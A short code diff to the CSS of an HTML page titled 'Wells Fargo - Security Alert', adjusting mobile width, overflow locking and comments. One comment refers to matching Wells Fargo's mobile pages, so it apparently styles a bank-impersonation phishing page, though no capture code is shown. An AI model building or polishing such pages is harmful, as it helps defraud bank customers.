@@ -5,6 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wells Fargo - Security Alert</title>
     <style>
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden; /* Locks the page from moving side-to-side */
+        }
+        
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             margin: 0;
@@ -17,15 +24,15 @@
             padding: 0;
             overflow-x: hidden; /* This hides the horizontal scrollbar */
         }
-
-        .content {
+      .content {
             width: 100%;
-            max-width: 480px; /* Matches the typical mobile width of Wells Fargo pages */
-            margin: 0 auto;
+            max-width: 480px; /* Locks the width to a mobile size */
+            margin: 0 auto;   /* Centers the box perfectly */
             padding: 20px 15px;
-            box-sizing: border-box; /* Ensures padding doesn't increase total width */
+            box-sizing: border-box; /* Prevents padding from breaking the width */
             background-color: #ffffff;
         }
+      
 
         /* Ensure all inputs and buttons don't break the layout */
         input, button, select, textarea {
